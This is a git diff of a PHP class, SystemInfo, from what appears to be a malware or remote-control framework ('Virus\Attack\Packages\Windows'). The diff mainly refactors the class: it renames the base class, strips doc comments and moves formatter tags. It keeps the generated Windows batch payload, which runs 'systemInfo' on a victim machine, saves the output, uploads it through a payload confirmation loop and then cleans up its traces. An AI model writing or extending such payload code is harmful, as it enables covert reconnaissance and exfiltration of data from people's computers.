@@ -1,11 +1,11 @@
-<?php /** @noinspection PhpUnused */
+<?php
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
-class SystemInfo extends AttackInterface {
+class SystemInfo extends AttackBase {
     public string $systemInfo = "";
 
     public function getSystemInfo(): string {
@@ -16,21 +16,11 @@ class SystemInfo extends AttackInterface {
         $this->systemInfo = $systemInfo;
     }
 
-    /**
-     * This will restore the state of an attack with all of its configuration using a json string.
-     *
-     * @param string $json The JSON string
-     */
     protected function setState(string $json): void {
         $state = json_decode($json, true);
-        $this->systemInfo = $state["systemInfo"];// == null ? "" : $state["systemInfo"];
+        $this->systemInfo = $state["systemInfo"];
     }
 
-    /**
-     * This will get the state of an attack as a json string.
-     *
-     * @return string The JSON string
-     */
     protected function getState(): string {
         $state = [];
         $state["systemInfo"] = $this->systemInfo;
@@ -43,25 +33,15 @@ class SystemInfo extends AttackInterface {
         <?php return ob_get_clean();
     }
 
-    /**
-     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
-     *
-     * @return string
-     */
-    //@formatter:off
     public function generateBatchCode(): string {
-        ob_start(); ?>
+        ob_start(); //@formatter:off ?>
         chCp 65001
         systemInfo > %~pd0system
-        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
+        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); //@formatter:on
         echo BaseScriptWin::cleanUpPayload();
         return ob_get_clean();
     }
-    //@formatter:on
 
-    /**
-     * @inheritDoc
-     */
-    public function processExtras(string $resource): void {
+    public function processExtras(string $resourceIdentifier): void {
     }
 }
